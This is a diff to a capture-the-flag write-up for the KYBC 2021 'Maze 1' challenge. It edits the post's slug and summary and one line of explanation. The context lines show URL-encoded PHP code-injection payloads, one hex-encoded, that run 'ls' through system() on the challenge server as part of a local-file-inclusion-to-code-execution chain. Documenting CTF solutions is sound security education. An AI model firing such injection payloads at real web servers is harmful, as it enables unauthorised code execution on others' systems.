@@ -2,9 +2,9 @@ Title: KYBC 2021 - Maze 1 Writeup
 Date: 2021-03-17
 Category: CTF
 Tags: ctf, lfi, rce, kybc
-Slug: kybc-yogosha-2021-writeups
+Slug: kybc-yogosha-2021-maze-1-writeups
 Author: Giulia Vergottini
-Summary: My writeup for Maze 1 challenge at KYBC CTF
+Summary: Writeup for Maze 1 challenge at KYBC CTF
 
 
 The site is basically a search box that checks for matching txt files and then redirects to `http://5.150.254.85:8082/lookup.php?f=file.txt` to display the content of the file. `flag.txt` obviously leads to a fake flag, but the whole thing looks like a potential LFI.
@@ -41,8 +41,7 @@ Let's run `ls /`
 http://5.150.254.85:8082/search=%3C%3Fphp%20system%28%27ls%20-al%27%29%3B%20%3F%3E&submit=submit
 
 ```
-
-No flag in the root folder, but `home/ctf_user1` seems interesting:
+and check the outcome in the proc file. No flag in the root folder, but `home/ctf_user1` seems interesting:
 ```
 http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%6c%73%20%2d%61%6c%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%27%29%3b%20%3f%3e&submit=submit
 ```
